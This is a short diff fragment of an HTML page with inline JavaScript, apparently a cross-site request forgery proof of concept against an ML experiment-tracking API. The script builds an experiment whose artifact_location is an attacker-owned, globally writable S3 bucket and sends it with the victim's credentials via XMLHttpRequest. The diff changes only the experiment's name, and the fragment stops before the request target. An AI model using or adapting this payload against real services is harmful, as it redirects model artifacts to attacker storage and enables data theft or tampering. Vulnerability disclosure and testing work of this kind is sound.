@@ -8,7 +8,7 @@
     <script>
     function execQuark() {
 
-    var data = "{\n\"name\":\"New Data\",\n\"artifact_location\":\"s3://bucket-attacker-owns-thats-globally-writable/0\"\n}";
+    var data = "{\n\"name\":\"Injected Experiment\",\n\"artifact_location\":\"s3://bucket-attacker-owns-thats-globally-writable/0\"\n}";
     
     var xhr = new XMLHttpRequest();
     xhr.withCredentials = true;
